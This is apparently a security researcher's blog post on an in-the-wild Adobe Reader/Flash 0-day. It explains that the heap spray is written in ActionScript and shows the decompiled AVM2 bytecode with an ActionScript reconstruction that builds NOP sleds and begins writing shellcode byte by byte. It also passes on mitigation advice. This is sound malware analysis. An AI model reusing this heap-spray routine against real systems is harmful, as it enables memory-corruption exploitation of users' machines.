@@ -1,0 +1,140 @@
+As you may have heard, there's a new Adobe PDF-or-Flash-or-something 0-day in the
+wild.
+So this is a quick note about how it's implemented, but this
+blog post is not going to cover any details about the exploit itself.
+Most of the Acrobat exploits over the last several months use the, now
+common, heap spraying
+technique, implemented in
+language that Adobe thought would
+go well with static documents.
+(Cause that went so well
+(Ironically, PDF has now come full circle back
+to having the features of Postscript that it was
+trying to get away from.)
+The exploit could be made far far less reliable, by
+disabling Javascript in
+your Adobe Acrobat Reader.
+But apparently there's no easy way to disable Flash through the UI.
+US-CERT recommends renaming the
+%ProgramFiles%\Adobe\Reader 9.0\Reader\authplay.dll and
+files.
+[Edit: Actually the source for this advice is the Adobe Product Security Incident Response Team (PSIRT).]
+Anyway, here's why… Flash has it's own version of ECMAScript called
+Actionscript, and whoever wrote this new 0-day, finally did something new by
+implementing the heap-spray routine with Actionscript inside of Flash.
+Actionscript is tokenized/compiled into an instruction set for an
+Actionscript Virtual Machine [AVM¹]
+and it retains much of the same shape
+in bytecode form, as the original Actionscript source.
+This makes it fairly
+easy to de-compile the byte code back into something easier to read.
+For
+example: [Original flash filename replaced with xxxxx here]
+constructor * <q>[public]xxxxx_fla::MainTimeline=()(0 params, 0 optional)
+[stack:3 locals:1 scope:10-11 flags:]
+00000) + 0:0 getlocal_0
+00001) + 1:0 pushscope
+00002) + 0:1 getlocal_0
+00003) + 1:1 constructsuper 0 params
+00004) + 0:1 findpropstrict <q>[public]::addFrameScript
+00005) + 1:1 pushbyte 0
+00006) + 2:1 getlex <q>[packageinternal]xxxxx_fla::frame1
+00007) + 3:1 callpropvoid <q>[public]::addFrameScript, 2 params
+00008) + 0:1 returnvoid
+This may be incorrect, because I'm using only the fantastic power of my own brain
+to decompile this, but this is approximately what it says in English, er I mean
+And then frame1 [see Appendix] is vaguely like this:
+var a:String = "\13\13\13\13";
+var b:String = "\0c\0c\0c\0c"; // A heap address, and effectively x86 NOPs
+while ( b.length < 0x1000000 ) {
+b = b + a;
+// This brings us to instruction line 18 (see below)
+var byteArr:ByteArray = new ByteArray(); // lines 19 thru 22
+byteArr.writeByte(0x40); // lines 23 thru 34
+// lines 36 thru 46
+while (byteArr.length < 64 * 0x100000) {
+// line 47 onwards
+byteArr.writeByte(0x90); // NOP
+byteArr.writeByte(0x90); // NOP
+byteArr.writeByte(0x90); // NOP
+byteArr.writeByte(0x90); // NOP
+byteArr.writeByte(0x81); // 81EC 20010000 → SUB ESP,0x120
+// etc.
+etc.
+etc.
+building up the shellcode one byte at a time
+This is the output from the excellent SWFTools.
+slot 0: var <q>[public]::a:NULL
+slot 0: var <q>[public]::byteArr:<q>[public]flash.utils::ByteArray
+slot 0: var <q>[public]::b:NULL
+method * <q>[packageinternal]xxxxx_fla::frame1=()(0 params, 0 optional)
+[stack:3 locals:1 scope:10-11 flags:] slot:0
+00000) + 0:0 getlocal_0
+00001) + 1:0 pushscope
+00002) + 0:1 findproperty <q>[public]::b
+00003) + 1:1 pushstring "\0c\0c\0c\0c"
+00004) + 2:1 initproperty <q>[public]::b
+00005) + 0:1 findproperty <q>[public]::a
+00006) + 1:1 pushstring "\13\13\13\13"
+00007) + 2:1 initproperty <q>[public]::a
+00008) + 0:1 jump ->15
+00009) + 0:1 label
+00010) + 0:1 findproperty <q>[public]::b
+00011) + 1:1 getlex <q>[public]::b
+00012) + 2:1 getlex <q>[public]::a
+00013) + 3:1 add
+00014) + 2:1 initproperty <q>[public]::b
+00015) + 0:1 getlex <q>[public]::b
+00016) + 1:1 getproperty <multi>{
+00017) + 1:1 pushint 1048576
+00018) + 2:1 iflt ->9
+00019) + 0:1 findproperty <q>[public]::byteArr
+00020) + 1:1 findpropstrict <q>[public]flash.utils::ByteArray
+00021) + 2:1 constructprop <q>[public]flash.utils::ByteArray, 0 params
+00022) + 2:1 initproperty <q>[public]::byteArr
+00023) + 0:1 getlex <q>[public]::byteArr
+00024) + 1:1 pushbyte 64
+00025) + 2:1 callpropvoid <q>[public]::writeByte, 1 params
+00026) + 0:1 getlex <q>[public]::byteArr
+00027) + 1:1 pushbyte 64
+00028) + 2:1 callpropvoid <q>[public]::writeByte, 1 params
+00029) + 0:1 getlex <q>[public]::byteArr
+00030) + 1:1 pushbyte 64
+00031) + 2:1 callpropvoid <q>[public]::writeByte, 1 params
+00032) + 0:1 getlex <q>[public]::byteArr
+00033) + 1:1 pushbyte 64
+00034) + 2:1 callpropvoid <q>[public]::writeByte, 1 params
+00035) + 0:1 jump ->41
+00036) + 0:1 label
+00037) + 0:1 getlex <q>[public]::byteArr
+00038) + 1:1 getlex <q>[public]::b
+00039) + 2:1 pushstring "iso-8859-1"
+00040) + 3:1 callpropvoid <q>[public]::writeMultiByte, 2 params
+00041) + 0:1 getlex <q>[public]::byteArr
+00042) + 1:1 getproperty <q>[public]::length
+00043) + 1:1 pushint 1048576
+00044) + 2:1 pushbyte 64
+00045) + 3:1 multiply
+00046) + 2:1 iflt ->36
+00047) + 0:1 getlex <q>[public]::byteArr
+00048) + 1:1 pushshort 144
+00049) + 2:1 callpropvoid <q>[public]::writeByte, 1 params
+00050) + 0:1 getlex <q>[public]::byteArr
+00051) + 1:1 pushshort 144
+00052) + 2:1 callpropvoid <q>[public]::writeByte, 1 params
+00053) + 0:1 getlex <q>[public]::byteArr
+00054) + 1:1 pushshort 144
+00055) + 2:1 callpropvoid <q>[public]::writeByte, 1 params
+00056) + 0:1 getlex <q>[public]::byteArr
+00057) + 1:1 pushshort 144
+00058) + 2:1 callpropvoid <q>[public]::writeByte, 1 params
+00059) + 0:1 getlex <q>[public]::byteArr
+00060) + 1:1 pushshort 144
+And as Bojan Zdrnja at ISC points out, there are two different shellcode payloads being used.
+I might write something more about these tomorrow (no promises).
+Most of the changed lines in this diff, are just jump offsets, which are different between the two, as there was some code added/deleted between them, and I haven't normalized this yet.
+¹The only document I've found on this so far:
+avm2overview.pdf All other
+information is in source code form.
+Questions/Comments to research [@] fireeye .
+com
